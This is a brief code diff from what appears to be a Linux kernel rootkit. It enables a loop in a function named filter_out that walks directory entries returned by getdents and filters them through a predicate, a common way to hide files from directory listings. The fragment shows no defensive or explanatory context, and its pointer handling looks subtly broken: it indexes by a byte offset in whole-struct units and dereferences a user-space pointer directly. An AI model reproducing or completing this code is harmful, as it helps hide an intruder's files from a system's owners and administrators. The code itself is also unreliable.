@@ -60,9 +60,8 @@ static inline int filter_out(struct linux_dirent __user *dirp, int length, int (
 	unsigned short reclen;
 	struct linux_dirent d;
 	// Why ints? Because getdents[64] returns an int.
-	pred(*dirp);
 	
-	/*while (index < length) {
+	while (index < length) {
 		d = *(dirp+index);
 		reclen = d.d_reclen;
 		pred(d);
@@ -79,7 +78,7 @@ static inline int filter_out(struct linux_dirent __user *dirp, int length, int (
 		}
 		
 		index += reclen;
-	}*/
+	}
 	
 	return length;
 }
